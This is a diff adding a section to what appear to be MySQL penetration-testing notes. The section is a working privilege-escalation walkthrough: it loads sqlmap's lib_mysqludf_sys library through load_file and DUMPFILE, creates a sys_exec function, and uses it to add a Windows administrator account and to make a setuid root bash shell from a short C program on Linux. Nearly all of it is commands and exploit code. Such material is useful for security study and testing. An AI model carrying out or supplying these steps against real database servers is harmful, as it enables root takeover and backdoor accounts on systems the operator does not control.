@@ -25,3 +25,59 @@ auxiliary/scanner/mysql/mysql_version
 auxiliary/scanner/mysql/mysql_writable_dirs
 
 
+
+# UDF Vulnerability
+For this attack we must have the mysql root account and we will want
+to browse to the udf directory in sqlmap (who kindly organized the
+exploits for us) and select the appropriate library depending on your
+target platform:
+
+- udf/mysql/linux/32/lib_mysqludf_sys.so     (or i686)
+- udf/mysql/linux/64/lib_mysqludf_sys.so
+- udf/mysql/windows/32/lib_mysqludf_sys.dll
+- udf/mysql/windows/64/lib_mysqludf_sys.dll
+
+Then move this library onto the target system in some way.
+We assume on either windows or linux we are logged as user "npn" and launch
+the mysql client as root user.
+On windows, the process is as follows:
+- USE mysql;
+- CREATE TABLE npn(line blob);
+- INSERT INTO npn values(load_file('C://xampplite//htdocs//mail//lib_mysqludf_sys.dll'));
+- SELECT * FROM mysql.npn INTO DUMPFILE 'c://windows//system32//lib_mysqludf_sys_32.dll';
+- CREATE FUNCTION sys_exec RETURNS integer SONAME 'lib_mysqludf_sys_32.dll';
+- SELECT sys_exec("net user npn npn12345678 /add");
+- SELECT sys_exec("net localgroup Administrators npn /add");
+
+On GNU/Linux the process is almost identical, remember to always assume
+that we are logged as user "npn" and execute `mysql -u root`:
+- mysql> use mysql;
+- mysql> create table npn(line blob);
+- mysql> insert into npn values(load_file('/home/npn/lib_mysqludf_sys_.so'));  /* the path to our exploit */
+- mysql> select * from npn into dumpfile '/usr/lib/lib_mysqludf_sys.so';
+- mysql> select * from npn into dumpfile '/usr/lib/lib_mysqludf_sys_.so';
+- mysql> create function sys_exec returns integer soname 'lib_mysqludf_sys.so';
+- mysql> create function sys_exec returns integer soname 'lib_mysqludf_sys_.so';
+- mysql> select sys_exec('id > /tmp/out; chown npn.npn /tmp/out');
+
+Note that to it returned some errors sometimes i just modified the
+procedure in GNU/Linux to cover any eventual failure, we can reproduce
+the steps on windows.
+
+Then we can compile a small C shell:
+```c
+#include <stdio.h>
+#include <sys/types.h>
+#include <unistd.h>
+int main(void)
+{
+setuid(0); setgid(0); system(“/bin/bash”);
+}
+```
+Remember to compile with `-m32` if we need it for i686 (i.e., or in general 32 bits)
+copy the exploit on the target machine and then from the hacked mysql root shell
+execute:
+- mysql> select sys_exec('chown root.root /tmp/shell');
+- mysql> select sys_exec('chmod +s /tmp/shell');
+
+Ok now we can just execute the shell and chek identity with id.
